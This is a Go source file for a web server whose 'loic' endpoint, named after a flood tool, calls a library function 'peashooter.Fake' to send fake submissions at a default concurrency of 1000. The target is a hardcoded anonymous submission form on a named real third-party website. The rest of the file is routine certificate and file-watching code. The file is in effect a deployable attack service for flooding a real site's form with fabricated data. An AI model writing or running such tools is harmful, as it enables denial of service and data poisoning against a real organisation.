package main

import (
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strconv"

	"github.com/fsnotify/fsnotify"
	"github.com/gorilla/mux"
	"github.com/guygrigsby/peashooter"
	"github.com/sirupsen/logrus"
	"golang.org/x/crypto/acme/autocert"
)

const (
	DEFAULT_CONCURRENCY = 1000
	DEFAULT_INDEX_LOC   = "public/index.html"
)

var (
	hotload bool
	domain  string
	index   *[]byte
)

func main() {
	flag.BoolVar(&hotload, "hotload", false, "hoot reloading of index.html for developmnt.")
	flag.StringVar(&domain, "domain", "", "domain name to request your certificate")
	flag.Parse()

	log := logrus.New()

	f, err := os.Open(DEFAULT_INDEX_LOC)
	if err != nil {
		panic(err)
	}

	i, err := io.ReadAll(f)
	if err != nil {
		panic(err)
	}
	index = &i

	go Watch(
		[]string{DEFAULT_INDEX_LOC},
		func(b []byte) error {
			*index = b
			return nil
		},
		log.WithField("service", "watcher"),
	)

	var (
		concurrency int
		ctx         = context.Background()
		formURL     = "https://prolifewhistleblower.com/anonymous-form/"
	)
	c, err := strconv.ParseInt(os.Getenv("PEASHOOTER_CONCURRENCY"), 10, 16)
	if err != nil {

		concurrency = DEFAULT_CONCURRENCY
	} else {
		concurrency = int(c)
	}
	r := mux.NewRouter()
	r.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		_, err := w.Write(*index)
		if err != nil {
			http.Error(w, "Cannot open index.html", http.StatusInternalServerError)
			return
		}
	})
	r.HandleFunc("loic", LOICHandler(ctx, formURL, concurrency, log.WithField("service", "peashooter")))
	r.Handle("/", http.FileServer(http.Dir("../frontend/build")))

	fmt.Println("TLS domain", domain)
	certManager := autocert.Manager{
		Prompt:     autocert.AcceptTOS,
		HostPolicy: autocert.HostWhitelist(domain),
		Cache:      autocert.DirCache("certs"),
	}

	tlsConfig := certManager.TLSConfig()
	tlsConfig.GetCertificate = getSelfSignedOrLetsEncryptCert(&certManager)
	server := http.Server{
		Addr:      ":443",
		Handler:   r,
		TLSConfig: tlsConfig,
	}

	go http.ListenAndServe(":80", certManager.HTTPHandler(nil))
	fmt.Println("Server listening on", server.Addr)
	if err := server.ListenAndServeTLS("", ""); err != nil {
		fmt.Println(err)
	}
	fmt.Printf("Server listening on %s", server.Addr)
	if err := server.ListenAndServeTLS("certs/localhost.crt", "certs/localhost.key"); err != nil {
		fmt.Println(err)
	}

	if err := http.ListenAndServe(":3000", r); err != nil {
		log.WithField("error", err).Error("Server Failure")
	}

}

func LOICHandler(ctx context.Context, uri string, concurrency int, log *logrus.Entry) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {

		res, err := peashooter.Fake(ctx, uri, r, concurrency, log)
		if err != nil {
			http.Error(w, "cannot init paeashooter", http.StatusInternalServerError)
			return
		}
		fmt.Printf("%+v", res)
	}
}
func getSelfSignedOrLetsEncryptCert(certManager *autocert.Manager) func(hello *tls.ClientHelloInfo) (*tls.Certificate, error) {
	return func(hello *tls.ClientHelloInfo) (*tls.Certificate, error) {
		dirCache, ok := certManager.Cache.(autocert.DirCache)
		if !ok {
			dirCache = "certs"
		}

		keyFile := filepath.Join(string(dirCache), hello.ServerName+".key")
		crtFile := filepath.Join(string(dirCache), hello.ServerName+".crt")
		certificate, err := tls.LoadX509KeyPair(crtFile, keyFile)
		if err != nil {
			fmt.Printf("%s\nFalling back to Letsencrypt\n", err)
			return certManager.GetCertificate(hello)
		}
		fmt.Println("Loaded selfsigned certificate.")
		return &certificate, err
	}
}

// Watch ...
func Watch(files []string, update func(b []byte) error, log *logrus.Entry) {
	watcher, err := fsnotify.NewWatcher()
	if err != nil {
		log.WithField("err", err).Error("File watcher failure. Cannot start watcher")
		return
	}
	defer watcher.Close()

	done := make(chan bool)
	go func() {

		for {

			select {

			case event := <-watcher.Events:

				log.WithFields(logrus.Fields{
					"event": fmt.Sprintf("%+v", event),
					"type":  event.Op,
				}).Info("Watcher Event")
				if event.Op&fsnotify.Write == fsnotify.Write {

					f, err := os.Open(DEFAULT_INDEX_LOC)
					if err != nil {
						log.WithField("err", err).Error("Cannot open watched file")
					}

					i, err := io.ReadAll(f)
					if err != nil {
						log.WithField("err", err).Error("Cannot read watched file")
					}

					*index = i
					log.WithField("file", event.Name).Info("configuration file updated")
					f.Close()

				}

			case err := <-watcher.Errors:

				log.WithField("err", err).Error("File watcher error")
			}
		}
	}()

	for _, file := range files {

		err = watcher.Add(file)
		if err != nil {

			log.WithFields(logrus.Fields{
				"file": file,
				"err":  err,
			}).Error("File watcher failure: Cannot add file")
			return
		}
		log.WithField("file", file).Info("placed watch on file")
	}

	<-done
}
